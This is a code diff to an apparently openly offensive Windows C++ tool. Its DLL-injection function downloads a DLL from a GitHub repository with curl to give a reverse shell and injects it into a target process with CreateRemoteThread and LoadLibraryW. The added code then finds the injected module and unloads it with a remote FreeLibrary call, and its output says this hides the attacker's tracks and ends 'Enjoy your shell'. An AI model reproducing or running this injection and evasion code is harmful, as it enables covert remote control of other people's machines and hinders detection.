@@ -5,11 +5,13 @@
 #include <string>
 #include <conio.h>
 #include <lmcons.h>
+#include <tchar.h>
 #include <strsafe.h>
 #include <sddl.h>
 #include <userenv.h>
 #include <Dbghelp.h>
 #include <winternl.h>
+#include <psapi.h>
 #include "def.h"
 
 #pragma comment(lib, "userenv.lib")
@@ -227,6 +229,11 @@ BOOL NamedPipeImpersonate()
 
 bool D11Inj3ct0r(DWORD pid)
 {
+    HMODULE hMods[1024];
+    //HANDLE hProcess;
+    DWORD cbNeeded;
+    unsigned int i;
+
     cout << "[+] Downloading your dll from the elevationstation repo for the rev sh311 now!\n";
     WinExec("curl -# -L -o \"c:\\users\\public\\mig2.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/d11inj3ction_files/mig2.dll\"", 0);
     Sleep(3000);
@@ -284,13 +291,53 @@ bool D11Inj3ct0r(DWORD pid)
             exit(0);
         }
         printf("[+] Creating remote thread...\n");
-        PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-        if (!CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL))
+        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL))
         {
             printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
             exit(0);
         }
         printf("[+] Remote Process Injection completed successfully!!!\n");
+        printf("[+] Now, time to unload the injected dll to hide our tracks...\n");
+        Sleep(5000);
+
+        //close module handle to dll
+        if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
+        {
+            for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
+            {
+                TCHAR szModName[MAX_PATH];
+
+                // Get the full path to the module's file.
+
+                if (GetModuleFileNameEx(processHandle, hMods[i], szModName,
+                    sizeof(szModName) / sizeof(TCHAR)))
+                {
+                    // Print the module name and handle value.
+                    if (_tcscmp(szModName, L"C:\\Users\\public\\mig2.dll") == 0)
+                    {
+                        printf("[+] found the dll within the injected process!\n");
+                        _tprintf(L"\t%s (0x%08X)\n", szModName, hMods[i]);
+
+                        
+                        PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "FreeLibrary");
+                        if (!CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, hMods[i], 0, NULL))
+                        {
+                            printf("[!] couldn't create remote thread...Error Code: %d", GetLastError());
+                            exit(0);
+                        }
+                        else
+                        {
+                            std::cout << "[+] CreateRemoteThread success and injected dll unloaded!  Enjoy your shell ;)\n";
+                            exit(0);
+                        }
+
+                    }
+                }
+            }
+        }
+
+
         CloseHandle(processHandle);
 
         return 0;
